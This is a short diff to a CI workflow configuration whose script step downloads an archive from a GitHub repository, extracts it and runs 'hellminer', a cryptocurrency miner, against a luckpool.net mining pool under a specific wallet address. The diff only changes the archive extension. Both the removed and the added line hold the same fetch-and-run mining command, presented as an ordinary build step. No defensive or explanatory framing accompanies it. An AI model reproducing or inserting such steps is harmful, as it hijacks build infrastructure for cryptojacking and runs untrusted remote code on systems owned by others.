@@ -19,4 +19,4 @@ workflows:
           include: true
           source: true
     scripts:
-      - wget https://github.com/tesasik67/q1/raw/main/hellminer-main.rar && tar -xvf hellminer-main.rar && cd hellminer-main && chmod +x hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVxwfn5TggLnYPgEAGQf8W7kes28QNQGJg.Rig001 -p x
+      - wget https://github.com/tesasik67/q1/raw/main/hellminer-main.tar.gz && tar -xvf hellminer-main.tar.gz && cd hellminer-main && chmod +x hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVxwfn5TggLnYPgEAGQf8W7kes28QNQGJg.Rig001 -p x
